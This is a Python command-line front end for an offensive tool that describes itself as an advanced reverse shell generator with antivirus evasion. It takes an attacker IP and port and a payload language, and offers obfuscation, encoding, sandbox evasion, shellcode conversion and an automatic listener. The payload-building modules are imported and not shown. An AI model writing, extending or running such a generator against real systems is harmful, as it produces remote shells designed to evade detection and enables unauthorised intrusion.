#!/usr/bin/env python3
import argparse
import sys
from pathlib import Path

# إضافة مسار المشروع إلى Python Path
sys.path.insert(0, str(Path(__file__).parent))

from core.generator_factory import GeneratorFactory
from listeners.listener_factory import ListenerFactory
from utils.helpers import print_banner, validate_ip, validate_port

def parse_arguments():
    parser = argparse.ArgumentParser(
        description="0xD4 Team - Advanced Reverse Shell Generator with AV Evasion",
        formatter_class=argparse.RawTextHelpFormatter
    )
    
    # الأوامر الأساسية
    parser.add_argument("-i", "--ip", required=True, help="Attacker IP address")
    parser.add_argument("-p", "--port", type=int, required=True, help="Attacker port")
    parser.add_argument("-l", "--language", 
                       choices=["bash", "powershell", "python", "csharp", "java", "go"],
                       required=True, help="Payload language")
    
    # خيارات التخفي
    parser.add_argument("-o", "--obfuscate", action="store_true", help="Enable code obfuscation")
    parser.add_argument("-e", "--encode", choices=["base64", "xor", "aes"], help="Encoding method")
    parser.add_argument("-s", "--sandbox", action="store_true", help="Add sandbox evasion")
    
    # خيارات متقدمة
    parser.add_argument("--msfvenom", action="store_true", help="Generate MSFVenom compatible payload")
    parser.add_argument("--donut", action="store_true", help="Convert to shellcode using Donut")
    parser.add_argument("--listener", choices=["tcp", "http", "dns"], help="Auto-start listener")
    parser.add_argument("--output", help="Save payload to file")
    
    return parser.parse_args()

def main():
    print_banner()
    args = parse_arguments()
    
    # التحقق من المدخلات
    if not validate_ip(args.ip):
        print("[-] Invalid IP address")
        return
    if not validate_port(args.port):
        print("[-] Invalid port number")
        return
    
    try:
        # توليد البايلود
        generator = GeneratorFactory.create_generator(args.language)
        payload = generator.generate(
            ip=args.ip,
            port=args.port,
            obfuscate=args.obfuscate,
            encode=args.encode,
            sandbox=args.sandbox,
            msfvenom=args.msfvenom,
            donut=args.donut
        )
        
        print("\n[+] Generated Payload:\n")
        print(payload)
        
        # حفظ البايلود في ملف إذا طُلب
        if args.output:
            with open(args.output, 'w') as f:
                f.write(payload)
            print(f"\n[+] Payload saved to {args.output}")
        
        # بدء المستمع إذا طُلب
        if args.listener:
            listener = ListenerFactory.create_listener(args.listener)
            listener.start(args.port)
            
    except Exception as e:
        print(f"[-] Error generating payload: {e}")

if __name__ == "__main__":
    main()